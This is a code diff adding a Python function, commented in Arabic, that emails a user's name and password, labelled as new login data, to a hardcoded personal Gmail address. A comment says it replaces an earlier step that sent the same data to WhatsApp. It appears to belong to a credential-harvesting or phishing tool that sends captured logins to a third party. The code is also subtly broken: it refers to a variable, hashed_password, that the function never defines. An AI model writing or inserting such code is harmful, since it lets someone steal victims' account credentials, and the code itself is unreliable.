@@ -1,0 +1,26 @@
+import smtplib
+from email.mime.text import MIMEText
+
+# ... باقي الكود الخاص بك ...
+
+def send_email(username, password):
+    # معلومات البريد الإلكتروني المرسل إليه
+    recipient = 'lucifer1976m@gmail.com'
+    subject = 'بيانات تسجيل دخول جديدة'
+    body = f"اسم المستخدم: {username}\nكلمة المرور (مشفرة): {hashed_password}"
+
+    # معلومات البريد الإلكتروني المرسل منه (قم بتغييرها إلى حسابك)
+    sender_email = 'your_email@gmail.com'
+    sender_password = 'your_email_password'
+
+    message = MIMEText(body)
+    message['From'] = sender_email
+    message['To'] = recipient
+    message['Subject'] = subject
+
+    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
+        smtp.login(sender_email, sender_password)
+        smtp.sendmail(sender_email, recipient, message.as_string())
+
+# ... في مكان إرسال الرسالة إلى واتساب، استبدلها بالدالة التالية:
+send_email(username, hashed_password)
